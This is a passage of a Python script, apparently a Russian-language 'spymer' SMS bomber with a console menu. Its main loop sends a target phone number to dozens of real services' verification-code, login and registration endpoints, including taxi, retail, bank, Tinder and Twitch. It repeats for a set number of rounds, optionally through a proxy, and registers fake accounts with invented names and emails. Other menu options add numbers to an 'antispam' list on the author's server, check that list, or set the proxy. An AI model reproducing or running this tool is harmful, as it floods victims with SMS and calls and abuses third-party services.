											_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
											_phone = phone
											_email = _name+f'{iteration}'+'@gmail.com'
											email = _email
											info = '\nТелефон: {}\nКол-во кругов: {}'.format(phone, count)+'\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.'
											os.system('cls' if os.name=='nt' else 'clear')
											print(logo)
											print(info)
											if _phone[0] == '9':
												_phone = '7'+_phone
											if proxy=="localhost":
												proxies=None
											else:
												proxies="{'"+ssl+"':'"+ip+"'}"
											while iteration < count:
												try:
													try:
														requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
													except:
														pass
													try:
														requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
													except:
														pass
													try:
														requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
													except:
														pass
													try:
														requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
													except:
														pass
														
													iteration += 1
													print(('{} круг.').format(iteration))
												except KeyboardInterrupt:
													info = Fore.RED+"\nСпамер остановлен.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
													main()
												except:
													pass
											info = Fore.BLUE+"\nГотово.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
								except:
									info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL


						except:
							info = Fore.RED+"\nНекорректно введен номер телефона!"+Style.RESET_ALL
					except KeyboardInterrupt:
						info = Fore.RED+"\nОтменено!"+Style.RESET_ALL
					except:
						info = Fore.RED+"\nНекорректный ввод данных!"+Style.RESET_ALL
			


			elif input1 == "2":
				print ("Введите номер:")
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				if phone[0] == '+':
					phone = phone[1:]
				if phone[0] == '8':
					phone = '7'+phone[1:]
				if phone[0] == '9':
					phone = '7'+phone
				try:
					if int(phone):
						id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
						if int(id) > 0:
							info = Fore.GREEN+"\nPhone {} is allready in antispam list.".format(phone)+Style.RESET_ALL
						elif int(id) == 0:
							result=requests.post('https://fsystem88.ru/spymer/ajax.php', data={'phone': phone}).json()["result"]
							if result == "no":
								info = Fore.RED+"\nТелефон {} НЕ добавлен в антиспам лист.\nВо избежание DDoS подождите час с момента последнего доавления номера в антиспам.".format(phone)+Style.RESET_ALL
							elif result == "yes":
								info = Fore.GREEN+"\nТелефон {} добавлен в антиспам лист.".format(phone)+Style.RESET_ALL
							elif result == "error":
								info = Fore.RED+"Ошибка"+Style.RESET_ALL
				except:
					info = Fore.RED+"\nНекорректно введен телефон!".format(phone)+Style.RESET_ALL
			
			elif input1 == "3":
				print ("Войдите в телефон для проверки:")
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				if phone[0] == '+':
					phone = phone[1:]
				if phone[0] == '8':
					phone = '7'+phone[1:]
				if phone[0] == '9':
					phone = '7'+phone
				try:
					if int(phone):
						id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
						if int(id) > 0:
							info = Fore.GREEN+"\nТелефон {} находится в антиспам листе.".format(phone)+Style.RESET_ALL
						elif int(id) == 0:
							info = Fore.RED+"\nТелефон {} не находится в антиспам листе.".format(phone)+Style.RESET_ALL
				except:
					info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL
			elif input1 == "4":
				try:
					print ("Введите http(s)://IP:port proxy.")
					print ("Пример: "+Fore.GREEN+"https://123.45.6.78:8080"+Style.RESET_ALL)
					print ("Для отмены нажмите Ctrl+C")
					proxy = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
					if proxy[:5]=="https":
						ssl="https"
						ip=proxy[8:]
						
					elif proxy[:5]=="http:":
						ssl="http"
						ip=proxy[7:]

					
				except KeyboardInterrupt:
					info = Fore.RED+"\nОтменено."+Style.RESET_ALL
					
				except:
					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
					proxy = "localhost"
			elif input1 == "5":
				print (Fore.BLUE+"\nДо скорой встречи!)\n"+Style.RESET_ALL)
				exit()
	main()
Main()
